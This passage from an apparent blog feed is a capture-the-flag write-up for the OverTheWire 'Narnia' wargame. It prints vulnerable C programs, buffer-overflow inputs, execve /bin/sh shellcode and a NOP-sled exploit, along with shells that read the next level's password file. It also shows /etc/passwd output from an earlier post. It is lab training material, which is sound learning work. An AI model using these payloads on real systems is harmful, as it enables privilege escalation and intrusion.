gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
user:x:1000:1000:user,,,:/home/user:/bin/bash
mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
candycane:x:1001:1001::/home/candycane:
&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; YOU STOLE MY SECRET FILE!
&lt;span class="gp"&gt;#&lt;/span&gt; &lt;span class="nv"&gt;SECRET&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&amp;quot;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;I had to poke around the file system a bit to find this, but &lt;code&gt;/etc/passwd&lt;/code&gt; is
usually a &lt;em&gt;go-to&lt;/em&gt; file if you get access to a system. Otherwise I'd still
be looking for the file now :)&lt;/p&gt;
&lt;p&gt;So that's one way to do it.&lt;/p&gt;
&lt;p&gt;This seems to be the most direct route in. It might be worth exploring the
vulnerabilities on the plugins, but it's late now, so I'll save that for
another time.&lt;/p&gt;
</summary></entry><entry><title>Solving Narnia Part 1</title><link href="http://unlogic.co.uk/2015/04/08/solving-narnia-part-1/" rel="alternate"></link><updated>2015-04-08T12:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-04-08:2015/04/08/solving-narnia-part-1/</id><summary type="html">&lt;p&gt;Next up we take on &lt;a class="reference external" href="http://overthewire.org/wargames/narnia/"&gt;Narnia&lt;/a&gt;. This is a
binary exploit centered wargame, so fire up your debuggers and let's smash those
stacks. For levels 5, 6, 7, and 8, see &lt;a class="reference external" href="http://unlogic.co.uk/2015/04/13/solving-narnia-part-2/"&gt;part 2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;All levels are in &lt;code&gt;/narnia&lt;/code&gt; and both the binary and the source are provided.&lt;/p&gt;
&lt;p&gt;I've not included the passwords here, so you'll have to work through
the exercises yourself (or find them elsewhere :))&lt;/p&gt;
&lt;div class="section" id="level-00"&gt;
&lt;h2&gt;Level 00&lt;/h2&gt;
&lt;pre class="code c literal-block"&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
        &lt;span class="kt"&gt;long&lt;/span&gt; &lt;span class="n"&gt;val&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x41414141&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

        &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Correct val's value from 0x41414141 -&amp;gt; 0xdeadbeef!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Here is your chance: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;scanf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%24s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

        &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;buf: %s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;val: 0x%08x&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;val&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;val&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mh"&gt;0xdeadbeef&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;WAY OFF!!!!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;

        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Lines 8 and 9 tell us what we need to do. So knowing how variable allocation
on the stack works, we can exploit the setup on lines 5 and 6. &lt;code&gt;buf&lt;/code&gt; is a
fixed size and is allocated &lt;em&gt;after&lt;/em&gt; &lt;code&gt;val&lt;/code&gt;. Therefore it sits above &lt;code&gt;val&lt;/code&gt; on
the stack. As there is no &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Address_space_layout_randomization"&gt;ASLR&lt;/a&gt;
we should be able to write over the end of &lt;code&gt;buf&lt;/code&gt; and overwrite what is in memory
at &lt;code&gt;val&lt;/code&gt;'s location.&lt;/p&gt;
&lt;p&gt;So let's try it&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;narnia0&amp;#64;melinda:/narnia$&lt;/span&gt; python -c &lt;span class="s2"&gt;&amp;quot;print 'C'*50&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; ./narnia0
&lt;span class="go"&gt;Correct val's value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCCCCC
val: 0x43434343
WAY OFF!!!!&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Right, we can confirm that we are able to change the value of &lt;code&gt;val&lt;/code&gt;. Let's
tread a bit more carefully and try to see if we can do it more accurately&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;narnia0&amp;#64;melinda:/narnia$&lt;/span&gt; python -c &lt;span class="s2"&gt;&amp;quot;print 'C'*20 + 'BBBB'&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; ./narnia0
&lt;span class="go"&gt;Correct val's value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCBBBB
val: 0x42424242
WAY OFF!!!!&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So there is no space between &lt;code&gt;val&lt;/code&gt; and &lt;code&gt;buf&lt;/code&gt;, therefore 20 characters plus a
further 4 is enough to change val. Let's write in the correct value, reversed of
course because of the endian notation&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;narnia0&amp;#64;melinda:/narnia$&lt;/span&gt; python -c &lt;span class="s2"&gt;&amp;quot;print 'C'*20 + '\xef\xbe\xad\xde'&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; ./narnia0
&lt;span class="go"&gt;Correct val's value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCﾭ
val: 0xdeadbeef
&lt;/span&gt;&lt;span class="gp"&gt;narnia0&amp;#64;melinda:/narnia$&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;We did it.... but wait, where's the shell? It's closed, that's where it is. We
need to keep it open. The trick is to append the &lt;code&gt;cat&lt;/code&gt; command to the input&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;narnia0&amp;#64;melinda:/narnia$&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;python -c &lt;span class="s2"&gt;&amp;quot;print 'C'*20 + '\xef\xbe\xad\xde'&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; cat&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; ./narnia0
&lt;span class="go"&gt;Correct val's value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCﾭ
val: 0xdeadbeef
id
uid=14000(narnia0) gid=14000(narnia0) euid=14001(narnia1) groups=14001(narnia1),14000(narnia0)
whoami
narnia1
cat /etc/narnia_pass/narnia1
[password]&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-01"&gt;
&lt;h2&gt;Level 01&lt;/h2&gt;
&lt;pre class="code c literal-block"&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
        &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="p"&gt;)();&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getenv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;EGG&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
                &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Give me something to execute at the env-variable EGG&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;

        &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Trying to execute EGG!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getenv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;EGG&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So here we need to set an environment variable named &lt;code&gt;EGG&lt;/code&gt; to something
we want executed. We can't just pass &lt;code&gt;/bin/bash&lt;/code&gt; as it's going to call whatever
we give it as a function. Ideally we want a shell, so what we need in this case
is the shellcode to do just that.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;narnia1&amp;#64;melinda:/narnia$&lt;/span&gt; &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;EGG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;python -c&lt;span class="s1"&gt;'print &amp;quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&amp;quot;'&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;narnia1&amp;#64;melinda:/narnia$&lt;/span&gt; ./narnia1
&lt;span class="go"&gt;Trying to execute EGG!
&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; whoami
&lt;span class="go"&gt;narnia2
&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat /etc/narnia_pass/narnia2
&lt;span class="go"&gt;[password]&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-02"&gt;
&lt;h2&gt;Level 02&lt;/h2&gt;
&lt;pre class="code c literal-block"&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[]){&lt;/span&gt;
        &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;128&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argc&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
                &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Usage: %s argument&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
                &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="n"&gt;strcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
        &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;The biggest clues here are lines 6 and 12. Copying user supplied data
into a fixed sized array without any bound checking is always asking for
trouble. &lt;code&gt;narnia2&lt;/code&gt; binary also runs as setuid narnia3, which leads us to believe
we will be able to control the stack and get it to execute a payload of our
choosing. Of course this will be a shellcode to drop us into a shell.&lt;/p&gt;
&lt;p&gt;First we need to work out how much data is needed to overwrite &lt;code&gt;EIP&lt;/code&gt;. We can
do this by trial and error, or we can use a pattern generator. I am going to
use my &lt;a class="reference external" href="https://github.com/Svenito/exploit-pattern"&gt;pattern generator&lt;/a&gt; instead
of metasploit's one. I'll create a payload big enugh to overflow the
buffer and then check the value of &lt;code&gt;EIP&lt;/code&gt;. Pasting that back into the pattern
generator will tell us at what location in the pattern the string occurs.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;local $] ./pattern.py 150
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9&lt;/span&gt;
&lt;/pre&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;narnia2&amp;#64;melinda:/narnia$&lt;/span&gt; gdb -q narnia2
&lt;span class="go"&gt;Reading symbols from narnia2...(no debugging symbols found)...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
Starting program: /games/narnia/narnia2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9

Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()
(gdb) info reg
eax            0x0      0
ecx            0x0      0
edx            0xf7fcb898       -134432616
ebx            0xf7fca000       -134438912
esp            0xffffd640       0xffffd640
ebp            0x65413565       0x65413565
esi            0x0      0
edi            0x0      0
eip            0x37654136       0x37654136
eflags         0x10282  [ SF IF RF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99&lt;/span&gt;
&lt;/pre&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;local $] ./pattern.py 0x37654136
Pattern 0x37654136 first occurrence at position 140 in pattern.&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;We can control &lt;code&gt;EIP&lt;/code&gt; with whatever we put at position 140 of our payload. But
what do we put there? Well for that we need to figure out where the rest of our
data is going. Using a known payload let's see where our input ends up:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;(gdb) run $(python -c &amp;quot;print 'a' * 140 + 'b' * 4&amp;quot;)
Starting program: /games/narnia/narnia2 $(python -c &amp;quot;print 'a' * 140 + 'b' * 4&amp;quot;)

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
(gdb) x/200x $esp
(gdb) x/200x $esp
0xffffd650:     0x00000000      0xffffd6e4      0xffffd6f0      0xf7feacea
0xffffd660:     0x00000002      0xffffd6e4      0xffffd684      0x08049768
0xffffd670:     0x0804821c      0xf7fca000      0x00000000      0x00000000
0xffffd680:     0x00000000      0xed18585e      0xd520bc4e      0x00000000
0xffffd690:     0x00000000      0x00000000      0x00000002      0x08048360
0xffffd6a0:     0x00000000      0xf7ff0500      0xf7e3c979      0xf7ffd000
0xffffd6b0:     0x00000002      0x08048360      0x00000000      0x08048381
0xffffd6c0:     0x0804845d      0x00000002      0xffffd6e4      0x080484d0
0xffffd6d0:     0x08048540      0xf7feb180      0xffffd6dc      0x0000001c
0xffffd6e0:     0x00000002      0xffffd812      0xffffd828      0x00000000
0xffffd6f0:     0xffffd8b9      0xffffd8cd      0xffffd8dd      0xffffd8f0
0xffffd700:     0xffffd913      0xffffd927      0xffffd930      0xffffd93d
0xffffd710:     0xffffde5e      0xffffde69      0xffffde75      0xffffded3
0xffffd720:     0xffffdeea      0xffffdef9      0xffffdf05      0xffffdf16
0xffffd730:     0xffffdf1f      0xffffdf32      0xffffdf3a      0xffffdf4a
0xffffd740:     0xffffdf80      0xffffdfa0      0xffffdfc0      0x00000000
0xffffd750:     0x00000020      0xf7fdbb60      0x00000021      0xf7fdb000
0xffffd760:     0x00000010      0x1f898b75      0x00000006      0x00001000
0xffffd770:     0x00000011      0x00000064      0x00000003      0x08048034
0xffffd780:     0x00000004      0x00000020      0x00000005      0x00000008
0xffffd790:     0x00000007      0xf7fdc000      0x00000008      0x00000000
0xffffd7a0:     0x00000009      0x08048360      0x0000000b      0x000036b2
0xffffd7b0:     0x0000000c      0x000036b2      0x0000000d      0x000036b2
0xffffd7c0:     0x0000000e      0x000036b2      0x00000017      0x00000000
0xffffd7d0:     0x00000019      0xffffd7fb      0x0000001f      0xffffdfe2
0xffffd7e0:     0x0000000f      0xffffd80b      0x00000000      0x00000000
0xffffd7f0:     0x00000000      0x00000000      0xe8000000      0x7c03ba19
0xffffd800:     0x2bd0895a      0x3866226d      0x69ad5957      0x00363836
0xffffd810:     0x672f0000      0x73656d61      0x72616e2f      0x2f61696e
0xffffd820:     0x6e72616e      0x00326169      0x61616161      0x61616161
0xffffd830:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd840:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd850:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd860:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd870:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd880:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd890:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd8a0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd8b0:     0x61616161      0x62626262      0x47445800      0x5345535f
0xffffd8c0:     0x4e4f4953      0x3d44495f      0x30333035      0x45485300
0xffffd8d0:     0x2f3d4c4c      0x2f6e6962      0x68736162      0x52455400
0xffffd8e0:     0x78723d4d      0x322d7476      0x6f633635      0x00726f6c
0xffffd8f0:     0x5f485353      0x45494c43      0x323d544e      0x322e3231
0xffffd900:     0x37352e33      0x3136312e      0x35333320      0x34203932
0xffffd910:     0x53003334      0x545f4853      0x2f3d5954      0x2f766564
0xffffd920:     0x2f737470      0x4c003033      0x4c415f43      0x00433d4c
0xffffd930:     0x52455355      0x72616e3d      0x3261696e      0x5f534c00
0xffffd940:     0x4f4c4f43      0x723d5352      0x3a303d73      0x303d6964
0xffffd950:     0x34333b31      0x3d6e6c3a      0x333b3130      0x686d3a36
0xffffd960:     0x3a30303d      0x343d6970      0x33333b30      0x3d6f733a&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;We see our payload start at &lt;code&gt;0xffffd828&lt;/code&gt; with the last 4 bytes at &lt;code&gt;0xffffd8b4&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The buffer gives us 128 bytes to play with. Our shellcode is 25 bytes, so we'll pad the
start with a &lt;a class="reference external" href="https://en.wikipedia.org/wiki/NOP_slide"&gt;nop sled&lt;/a&gt; to adjust for
the memory offset introduced by &lt;code&gt;gdb&lt;/code&gt;. Then set the &lt;code&gt;EIP&lt;/code&gt; to somewhere in the middle
of the sled&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;narnia2&amp;#64;melinda:/narnia$&lt;/span&gt; ./narnia2 &lt;span class="sb"&gt;`&lt;/span&gt;python -c &lt;span class="s2"&gt;&amp;quot;print '\x90'*115 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' + '\x60\xd8\xff\xff'&amp;quot;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; whoami
&lt;span class="go"&gt;narnia3
&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat /etc/narnia_pass/narnia3
&lt;span class="go"&gt;[password]&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-03"&gt;
&lt;h2&gt;Level 03&lt;/h2&gt;
&lt;pre class="code c literal-block"&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;

        &lt;span class="kt"&gt;int&lt;/span&gt;  &lt;span class="n"&gt;ifd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="n"&gt;ofd&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;ofile&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/dev/null&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;ifile&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
        &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

